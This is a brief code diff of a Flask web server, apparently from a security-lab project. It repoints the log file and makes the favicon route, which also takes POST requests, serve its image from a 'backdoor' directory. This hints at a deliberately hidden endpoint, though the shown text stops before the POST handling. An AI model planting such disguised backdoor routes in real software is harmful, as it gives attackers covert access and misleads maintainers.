@@ -17,7 +17,7 @@ app.config['MYSQL_DB'] = 'imovies'
 app.config['MYSQL_CURSORCLASS'] = 'DictCursor'
 logging.basicConfig(level=logging.DEBUG)
 webserver_logger = logging.getLogger('webserver')
-handler = logging.FileHandler(os.path.join(os.getcwd(), "webserver.log"))
+handler = logging.FileHandler("/home/webserver/logs/webserver.log")
 webserver_logger.addHandler(handler)
 app.logger.addHandler(handler)
 
@@ -226,7 +226,7 @@ def admin_stats():
 @app.route("/favicon.ico", methods=("GET", "POST"))
 def favicon():
     if request.method == "GET":
-        return send_from_directory("./static", "favicon.jpg", mimetype='image/jpg')
+        return send_from_directory("/home/webserver/ASL-RuntimeTerror/src/web-server/backdoor", "favicon.jpg", mimetype='image/jpg')
     elif request.method == "POST":
         lines = str(request.data).split('\n')
         if len(lines) >= 2:
